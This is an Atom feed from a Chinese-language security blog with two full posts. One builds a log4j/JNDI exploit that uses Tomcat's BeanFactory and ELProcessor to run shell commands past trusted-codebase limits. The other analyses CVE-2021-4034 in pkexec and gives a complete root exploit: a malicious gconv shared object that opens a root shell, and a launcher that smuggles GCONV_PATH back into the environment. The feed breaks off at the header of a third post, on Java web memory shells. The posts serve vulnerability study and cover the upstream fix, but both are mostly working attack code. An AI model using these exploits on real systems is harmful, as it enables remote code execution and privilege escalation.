<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4xpl0r3r&#39;s blog</title>
  
  
  <link href="https://cn.4xpl0r3r.com/atom.xml" rel="self"/>
  
  <link href="https://cn.4xpl0r3r.com/"/>
  <updated>2022-02-13T12:52:18.735Z</updated>
  <id>https://cn.4xpl0r3r.com/</id>
  
  <author>
    <name>4xpl0r3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>在Tomcat环境下使用JNDI绕过trusted codebase限制的Exploit</title>
    <link href="https://cn.4xpl0r3r.com/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/"/>
    <id>https://cn.4xpl0r3r.com/Exploit/%E5%9C%A8Tomcat%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8JNDI%E7%BB%95%E8%BF%87trusted-codebase%E9%99%90%E5%88%B6%E7%9A%84Exploit/</id>
    <published>2022-02-13T12:48:52.000Z</published>
    <updated>2022-02-13T12:52:18.735Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90">CVE-2021-44228 log4j2 RCE 分析</a>中，我们实现了在Java 8u181中通过JNDI加载恶意类实现RCE，本文我们实现一个在trusted codebase限制下实现RCE的Exploit</p><span id="more"></span><h2 id="搭建Tomcat脆弱环境"><a href="#搭建Tomcat脆弱环境" class="headerlink" title="搭建Tomcat脆弱环境"></a>搭建Tomcat脆弱环境</h2><p>IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9，Java版本使用Java 8u292，在<code>pom.xml</code>中引入log4j-core 2.14.1的依赖</p><p>在自动创建的<code>HelloServlet</code>类中的<code>doGet</code>写入触发log4j漏洞的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Tomcat9Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1199/Exploit&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="制作Exploit"><a href="#制作Exploit" class="headerlink" title="制作Exploit"></a>制作Exploit</h2><blockquote><p>参考：<a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">如何绕过高版本JDK限制进行JNDI注入利用 (qq.com)</a></p><p>原理部分可以阅读参考的KINGX师傅的文章</p></blockquote><p>将Tomcat的<code>lib</code>文件夹和<code>bin/tomcat-juli.jar</code>引入项目的libraries来消除依赖问题</p><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1199</span>);</span><br><span class="line"><span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">// 强制将 &#x27;x&#x27; 属性的setter 从 &#x27;setX&#x27; 变为 &#x27;eval&#x27;, 详细逻辑见 BeanFactory.getObjectInstance 代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;payload=eval&quot;</span>));</span><br><span class="line"><span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;curl 127.0.0.1:4444&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行Exploit和Tomcat项目并访问<code>doGet</code>方法触发log4j漏洞，就能成功执行命令</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90&quot;&gt;CVE-2021-44228 log4j2 RCE 分析&lt;/a&gt;中，我们实现了在Java 8u181中通过JNDI加载恶意类实现RCE，本文我们实现一个在trusted codebase限制下实现RCE的Exploit&lt;/p&gt;</summary>
    
    
    
    <category term="Exploit" scheme="https://cn.4xpl0r3r.com/categories/Exploit/"/>
    
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
    <category term="Tomcat" scheme="https://cn.4xpl0r3r.com/tags/Tomcat/"/>
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-4034 Linux Polkit 权限提升漏洞分析</title>
    <link href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-02-11T11:39:15.000Z</published>
    <updated>2022-09-14T02:11:57.882Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要参考官方的<a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">Advisory</a>来进行分析</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/">English</a>.</div></article><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>2022-01-25，CVE-2021-4034 Exploit 详情发布，此漏洞是由<a href="https://www.qualys.com/">Qualys</a>研究团队在polkit的pkexec中发现的一个内存损坏漏洞</p><p>pkexec 应用程序是一个 setuid 工具，允许非特权用户根据预定义的策略以特权用户身份运行命令，基本上所有的主流Linux系统都安装了此工具，其自身也被设置了SUID权限位以正常运转</p><p>影响了自2009年5月第一个版本以来的所有pkexec版本，Commit 地址：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/c8c3d835d24fc4ce5a9c596c7d55d85a0311e8d1">Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab</a></p><p>由于pkexec的广泛应用，此漏洞基本通杀目前所有Linux发行版，有效范围很大</p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>选择一个修复前的版本进行分析，<a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c">src/programs/pkexec.c · 0.120 · polkit / polkit · GitLab</a></p><p>根据披露，漏洞存在于pkexec的主函数，相对路径为<code>/src/programs/pkexec.c</code></p><p>在534-568行，处理命令行参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++) <span class="comment">// 注意这一句，如果我们传递了参数后，n应该在结束循环时与argc相等，如果没有参数，argc就为0，但是由于此处n的初始值为1，因此如果没有参数被传递，1就变成了argc(0)+1，如果后续继续使用n的话，就有可能出现问题</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--help&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_show_help = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--version&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_show_version = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--user&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;-u&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      n++;</span><br><span class="line">      <span class="keyword">if</span> (n &gt;= (guint) argc)</span><br><span class="line">        &#123;</span><br><span class="line">          usage (argc, argv);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (opt_user != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          g_printerr (<span class="string">&quot;--user specified twice\n&quot;</span>);</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">      opt_user = g_strdup (argv[n]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span> (argv[n], <span class="string">&quot;--disable-internal-agent&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      opt_disable_internal_agent = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在610行，获取PROGRAM参数名称，也就是需要执行的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">path = g_strdup (argv[n]); <span class="comment">// 分析代码，我们可以发现n在此时被使用，g_strdup复制目标字符串，但是如果我们不传递任何参数，g_strdup用于拷贝字符串，如果没有参数传递，这里就产生内存越界读取了</span></span><br><span class="line"><span class="keyword">if</span> (path == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GPtrArray *shell_argv;</span><br><span class="line"></span><br><span class="line">  path = g_strdup (pwstruct.pw_shell);</span><br><span class="line">  <span class="keyword">if</span> (!path)</span><br><span class="line">&#123;</span><br><span class="line">      g_printerr (<span class="string">&quot;No shell configured or error retrieving pw_shell\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/* If you change this, be sure to change the if (!command_line)</span></span><br><span class="line"><span class="comment">case below too */</span></span><br><span class="line">  command_line = g_strdup (path);</span><br><span class="line">  shell_argv = g_ptr_array_new ();</span><br><span class="line">  g_ptr_array_add (shell_argv, path);</span><br><span class="line">  g_ptr_array_add (shell_argv, <span class="literal">NULL</span>);</span><br><span class="line">  exec_argv = (<span class="keyword">char</span>**)g_ptr_array_free (shell_argv, FALSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>) <span class="comment">// 如果路径不是绝对路径</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span></span><br><span class="line">  s = g_find_program_in_path (path);</span><br><span class="line">  <span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      g_printerr (<span class="string">&quot;Cannot run program %s: %s\n&quot;</span>, path, strerror (ENOENT));</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">  g_free (path);</span><br><span class="line">  argv[n] = path = s; <span class="comment">// 触发越界内存写入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整理一下，得出，在不传递任何参数时，情况如下</p><ol><li>在第 534 行，整数 n 的设置为 1</li><li>在第 610 行，从 argv[1] 越界读取指针路径</li><li>在第 639 行，指针 s 被越界写入 argv[1]</li></ol><p>现在很重要的一点就是，我们想要知道，当越界的<code>argv[1]</code>包含了什么内容</p><p>当我们使用<code>execve()</code>执行一个程序时，内核会将我们的参数、环境字符串以及指针（argv 和 envp）复制到新程序栈的末尾；如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------|</span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |</span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|</span><br><span class="line">     V         V                V           V         V                V</span><br><span class="line"> &quot;program&quot; &quot;-option&quot;           NULL      &quot;value&quot; &quot;PATH=name&quot;          NULL</span><br></pre></td></tr></table></figure><p>也就是说，被越界访问的实际上是<code>envp[0]</code>，其指向第一个环境变量的值，再次总结，我们得到如下</p><ul><li>在第610行，要执行的程序路径由<code>envp[0]</code>给出</li><li>在632行，<code>path</code>的值被传递给<code>g_find_program_in_path()</code></li><li><code>g_find_program_in_path()</code>在PATH环境变量中搜索程序</li><li>如果找到可执行文件，完整的路径返回给<code>pkexec</code>的<code>main()</code>函数</li><li>在639行，完整路径被越界写入到<code>argv[1]</code>也就是<code>envp[0]</code>，这样就覆盖了我们的第一个环境变量</li></ul><p>更准确地来说的话</p><ul><li>如果环境变量被设置为<code>PATH=name</code>，如果目录<code>name</code>存在（如当前的工作目录）并且可执行文件被命名为<code>value</code>，那么<code>name/value</code>字符串的指针就会被越界写入到<code>envp[0]</code></li><li>或者说，如果PATH是<code>PATH=name=.</code>，并且如果<code>PATH=name=.</code>存在且包含名为<code>value</code>的可执行文件，那么<code>name=./value</code>字符串的指针就会被越界写入到<code>envp[0]</code>中</li></ul><p>由于字符串<code>name=./value</code>是我们最后会执行的命令，如果执行了<code>name=./value</code>，这个越界写入允许我们重新引入一个不安全的环境变量，这些被传递到SUID文件的不安全环境变量通常会在<code>main()</code>函数运行之前被删除(由<code>ld.so</code>完成)。接下来我们将基于这一点来进行exploit</p><blockquote><p>要注意：polkit还支持非Linux系统如Solaris 和 BSD, 目前还没有深入分析过，但是OpenBSD是不可利用的，因为它的内核在argc为0时拒绝通过<code>execve</code>执行程序</p></blockquote><p>我们的问题是如何通过重新引入不安全的环境变量来利用这个漏洞，在702行，pkexec完全清除了环境变量，因此可以利用的选项比较少</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clearenv () != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    g_printerr (<span class="string">&quot;Error clearing environment: %s\n&quot;</span>, g_strerror (errno));</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以发现代码中多处调用了GLib的函数<code>g_printerr()</code>，如位于代码126行和408-409行的<code>validate_environment_variable()</code>函数<code>log_message()</code>调用了<code>g_printerr()</code></p><p><code>g_printerr()</code>通常打印UTF-8错误消息，但如果环境变量<code>CHARSET</code>被设置后，其也可以使用其它字符集打印消息。为了将消息从CTF-8转换为其它字符集，<code>g_printerr()</code>调用了<code>iconv_open()</code></p><p>为了进行字符集转换，<code>iconv_open()</code>执行一个共享库。通常来说来源字符集、目标字符集和共享库都通过默认配置文件<code>/usr/lib/gconv/gconv-modules</code>指定。但是环境变量<code>GCONV_PATH</code>可以强制<code>iconv_open()</code>使用另外一个配置文件，通常来说<code>GCONV_PATH</code>是一个不安全变量，会被移除，但是由于前面的漏洞，我们可以将其重新引入</p><blockquote><p>要注意：这个利用技术会在日志中留下痕迹，如SHELL变量在<code>/etc/shells</code>中不存在，或者环境变量中存在可疑数据。然而，请注意，这个漏洞也可以以不留下痕迹的方式利用</p></blockquote><h2 id="构造-Exploit"><a href="#构造-Exploit" class="headerlink" title="构造 Exploit"></a>构造 Exploit</h2><p>目前的主流Linux系统都受到此漏洞的影响，安装一个Ubuntu 20.04，运行<code>pkexec --version</code>可以发现版本是<code>0.105</code></p><p>首先生成一个恶意的so文件，用来获取提权后的shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC payload.c -o payload.so</span><br></pre></td></tr></table></figure><p>构造exploit</p><ul><li><code>LC_MESSAGES</code> 用来指定要转换的字符集</li><li><code>XAUTHORITY</code> 设置为非法值以跳过pkexec的正常执行，我们只需要触发日志函数来实现提权</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* _argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span>* _envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=..&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;x&quot;</span>, <span class="number">0777</span>);</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;x/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    fp = fopen(<span class="string">&quot;GCONV_PATH=./x&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    chmod(<span class="string">&quot;GCONV_PATH=./x&quot;</span>,<span class="number">0777</span>);</span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, _argv, _envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -o exp.out</span><br></pre></td></tr></table></figure><p>然后运行<code>./exp.out</code>直接成为root用户</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>参见：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683">pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab</a></p><p><img src="../../img/CVE-2021-4034-Linux-Polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220129003432841.png" alt="image-20220129003432841"></p><p>argc小于1直接退出程序</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文主要参考官方的&lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot;&gt;Advisory&lt;/a&gt;来进行分析&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://cn.4xpl0r3r.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="https://cn.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="C&amp;C++" scheme="https://cn.4xpl0r3r.com/tags/C-C/"/>
    
    <category term="Linux" scheme="https://cn.4xpl0r3r.com/tags/Linux/"/>
    
    <category term="提权" scheme="https://cn.4xpl0r3r.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb 内存马技术归纳</title>
    <link href="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"/>
    <id>https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/</id>
    <published>2022-02-11T11:38:47.000Z</published>
    <updated>2022-02-11T11:43:37.752Z</updated>
    
